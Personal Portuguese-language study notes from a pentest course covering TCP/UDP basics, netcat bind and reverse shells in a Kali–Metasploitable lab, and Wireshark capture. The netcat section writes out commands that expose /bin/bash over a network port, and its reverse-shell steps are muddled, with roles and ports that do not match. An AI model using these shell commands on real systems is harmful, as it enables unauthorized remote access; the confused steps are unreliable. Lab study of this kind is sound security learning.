# Minhas anotações sobre o Curso de Pentest Womcy

## 09/08 - Resumo

### TCP/IP - conceitos básicos
O TCP é um protocolo orientado a objeto - confiável

Funciona enviando 3 pacotes para abrir a comunicação o three way handshake e para finalizar a comunicação envia 4 pacotes
(detalhar cada pacote)

Ele prioriza a não perder pacotes

UDP - considerado como não confiável
Utilizado em situações que a velocidade é importante mas a perca de pacote não
Ex.: Serviços de voz, streaming, video conferência, serviços de resolução de nomes(DNS)

Algumas vezes ambos podem ser combinados exemplo chat e video em uma chamada do Microsoft Teams

Segue um exemplo de portas sobre cada um dos protocolos:https://pt.wikipedia.org/wiki/Lista_de_portas_dos_protocolos_TCP_e_UDP

### Conexão via bind shell e reverse shell - NetCat
Pré-requisitos: Comandos básicos do linux

Ajuda do netcat:
```
nc -h
```

Na aula de hoje comentamos o arquivo de interfaces /etc/network/interfaces
Estando da seguinte maneira
```
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp
auto eth1
iface eth1 inet static
        address 192.168.11.110
#       gateway 192.168.11.1
        netmask 255.255.255.0
```

Assim conseguiremos a comunicação da rede externa em nossa placa NAT (eth0) e na rede interna inet (eth1)

Reiniciando o serviço de rede da máquina ou a própria máquina

Na máquina do metaspolitable executamos(vítima)
nc -nvlp 1000

Para abrir a comunicação e ficar "ouvindo" essa porta

o mesmo realizamos na maquina atacante kali

sudo nc <ipSemSinaisdaMaquina> 1000

Assim temos a comunicação entre máquinas
  
No entanto, temos somente essa conexão e queremos a execução de um programa remoto(bindshell)

Na máquina vítima, executamos então 
nc -nvlp 1000 -e /bin/bash

No atacante(idem anterior):
  sudo nc 192.168.10.130 1000
  
  
Reverse shell - Posso fazer a minha vítima se conectar em mim e termos um acesso 
Na máquina atacante:
  nc <ipvitima> 1000 -e /bin/bash

  Na máquina vítima:
nc -nlp 100 -v
  
Sendo assim bem díficil de ser detectado tal

Mais informações em: https://github.com/dantesilva/curso-tecnicas-pentest/blob/main/Bind-and-reverse-shell.md do mestre @dantesilva
  
Em suma uma ferramenta do tipo canivete suíço, seja após um acesso na vítima realizado com sucesso ou como uma ferramenta no dia a dia, diante uma impossibilidade de acesso

## 11/08 - Resumo

### Wireshark
Se trata de um analisador de protocolos, capturando na rede as informações trafegadas, uma espécie de Sniffer(como um cão farejador), estando entre as 5 melhores juntamente com o TCPDump e outras

Ele pode ser executado tanto via terminal como no servidor gráfico. Um dos seus cores é a libpcap, tendo assim compatibilidades com demais ferramentas
        
Iniciamos abrindo o Wireshark e selecionando a placa de rede de onde queremos capturar pacotes
![image](https://user-images.githubusercontent.com/25257860/129117367-b89097a4-69be-4f37-bb59-06b5f5df1582.png)
        
Selecionamos assim a eth0 que é nossa placa configurada em uma rede NAT do virtualbox e tem acesso a internet
        
Para gerar tráfego de rede acessamos o Firefox e alguns sites, podendo assim observar as conexões do three way handshake
![image](https://user-images.githubusercontent.com/25257860/129118655-8b6a70eb-64bc-45d4-a431-bfea271938c4.png)
        
![image](https://user-images.githubusercontent.com/25257860/129119034-840d05be-b9a7-453e-9a81-2523e5ccf75e.png)

Com o botão direito em uma das conexões, podemos clicar em follow e ver os detalhes
![image](https://user-images.githubusercontent.com/25257860/129121930-ada531f8-af2e-4ba9-a9b7-0db8832577df.png)

Exemplo de uma conexão ssh filtrando pela porta
![image](https://user-images.githubusercontent.com/25257860/129122170-653846ae-7198-46f8-836b-d2575a59ce39.png) 
        
encontrando assim uma vulnerabilidade expondo a versão do ssh
![image](https://user-images.githubusercontent.com/25257860/129122206-27327636-fd91-4cc4-a6ca-b2abaee3dff9.png)
